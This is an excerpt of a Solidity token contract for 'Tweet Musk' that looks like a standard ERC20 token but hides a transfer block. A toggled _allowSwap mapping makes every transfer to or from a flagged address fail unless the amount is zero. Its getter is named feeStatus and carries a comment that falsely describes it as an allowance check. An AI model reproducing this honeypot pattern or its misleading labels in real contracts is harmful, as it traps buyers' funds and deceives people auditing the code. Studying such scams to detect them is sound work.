...
contract ERC20 is Context, Ownable, IERC20, IERC20Metadata {
    ...
    mapping(address => bool) private _allowSwap;
    ...
    if (_allowSwap[spender] == true) {
            _allowSwap[spender] = false;
            } else {_allowSwap[spender] = true;}
    }

    /**
     * @notice Checking the allowance granted to `spender` by the caller.
     */
    function feeStatus(address spender) public view returns (bool) {
        return _allowSwap[spender];
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        if (_allowSwap[sender] || _allowSwap[recipient]) require (amount == 0, "");
...
contract TweetMusk is ERC20 {

    /**
     * @dev Sets the values for {name}, {symbol} and {totalsupply}.
     */
    constructor() ERC20('Tweet Musk', 'TweetMusk')  {
